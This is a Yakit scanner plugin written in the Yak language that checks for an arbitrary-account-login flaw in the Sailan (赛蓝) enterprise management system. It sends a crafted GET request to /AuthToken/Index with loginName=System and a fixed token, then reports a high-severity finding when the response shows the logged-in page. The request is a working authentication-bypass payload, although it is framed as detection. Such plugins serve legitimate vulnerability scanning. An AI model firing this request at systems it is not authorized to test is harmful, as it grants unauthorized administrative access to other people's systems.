# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f  HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close

`

    rsp,req,_ = poc.HTTP(packet1,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(5),
    )

    //dump(rsp)
        if str.MatchAllOfSubString(rsp,'HTTP/1.1 200','基础资料'){
        yakit.Info("%v found 赛蓝企业管理系统  任意账号登录漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("赛蓝企业管理系统  任意账号登录漏洞"),
        risk.severity("high"),
        risk.titleVerbose("赛蓝企业管理系统  任意账号登录漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
